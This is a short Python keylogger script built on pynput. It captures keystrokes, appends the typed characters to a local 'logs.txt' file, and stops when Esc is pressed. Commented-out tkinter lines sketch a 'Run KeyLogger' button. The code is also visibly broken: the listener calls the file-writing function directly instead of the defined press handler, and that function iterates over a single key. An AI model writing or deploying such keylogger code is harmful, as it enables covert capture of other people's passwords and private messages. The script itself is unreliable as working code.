import pynput
from pynput.keyboard import Key, Listener


# import tkinter as tk
# from tkinter import *
# window = tk.Tk()
# window.geometry('450x500')

count = 0
keys = []
def on_press(key):
    global keys,count
    keys.append(key)
    count = count+1
    print("{0} pressed".format(key))

    if count >= 10:
        count=0
        wfile(keys)
        keys = []

def wfile(keys):
    with open("logs.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k == 'Key.space':
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False


# def butaction():
with Listener(on_press=wfile, on_release=on_release) as listener:
    listener.join()
    # window.quit()

# bt = tk.Button(window,text="Run KeyLogger",bg="white",fg="red",command=butaction)
# bt.grid(row=2, column=2)
# window.mainloop()
